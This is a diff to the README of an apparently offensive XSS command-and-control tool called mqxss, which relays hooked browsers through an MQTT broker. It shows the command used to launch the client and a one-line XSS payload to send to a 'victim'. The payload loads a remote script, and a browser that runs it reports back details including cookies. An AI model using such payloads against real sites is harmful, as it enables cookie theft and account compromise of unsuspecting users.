@@ -31,7 +31,7 @@ The client utilizes the python paho.mqtt library while the js payload utilizes '
 
 `mqxss.py -p 8081 -b some.mqtt.broker.com -t mytopicname -u username -pw password`
   
-**Send your XSS payload** to the victim while the mqxss client is running, ex: `'"><script src=https://example.com/x.js></script>` or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.
+**Send your XSS payload** to the victim while the mqxss client is running, ex: `'"><script src=https://example.com/x.js> async</script>` or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.
  
 ![a](https://github.com/grampae/mqxss/assets/36344197/20096c91-2e9e-4302-b5a9-e2edd665d382)
 
